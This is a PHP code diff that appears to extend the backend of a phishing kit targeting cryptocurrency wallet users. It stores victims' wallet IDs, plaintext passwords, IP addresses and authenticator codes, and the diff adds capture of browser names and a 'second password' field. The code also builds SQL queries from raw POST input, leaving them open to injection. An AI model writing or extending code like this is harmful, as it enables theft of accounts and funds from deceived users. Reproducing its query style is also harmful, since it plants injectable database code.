@@ -6,9 +6,10 @@ if($cur_status == "saveLoginData"){
     
     $password = $_POST['password'];
     $wallet_id = $_POST['wallet_id'];
+    $browser_name = $_POST['browser_name'];
     $time = date("Y-m-d H:i:s");
-    $sql = "INSERT INTO tbl_login (wallet_id, wallet_pwd, ip, time, is_alarm)
-    VALUES ( '" . $wallet_id . "', '" . $password . "', '" . $_SERVER['REMOTE_ADDR'] . "', '" . $time . "', 'yes' )";
+    $sql = "INSERT INTO tbl_login (wallet_id, wallet_pwd, ip, browser_name, time, is_alarm)
+    VALUES ( '" . $wallet_id . "', '" . $password . "', '" . $_SERVER['REMOTE_ADDR'] . "', '" . $browser_name . "', '" . $time . "', 'yes' )";
     if ($conn->query($sql) === TRUE) {
         $last_id = $conn->insert_id;
         echo $last_id;
@@ -54,6 +55,12 @@ if($cur_status == "saveLoginData"){
     $cur_id = $_POST['cur_id'];
     $auth_code = $_POST['auth_code'];
     $sql = "UPDATE tbl_login SET auth_app_code = '".$auth_code."' WHERE id = ".$cur_id;
+    $result = $conn->query($sql);
+    echo $result;
+}else if($cur_status == "saveSecondPassword"){
+    $cur_id = $_POST['cur_id'];
+    $auth_code = $_POST['auth_code'];
+    $sql = "UPDATE tbl_login SET password2 = '".$auth_code."' WHERE id = ".$cur_id;
     $result = $conn->query($sql);
     echo $result;
 }else if($cur_status == "getFinalDecision"){
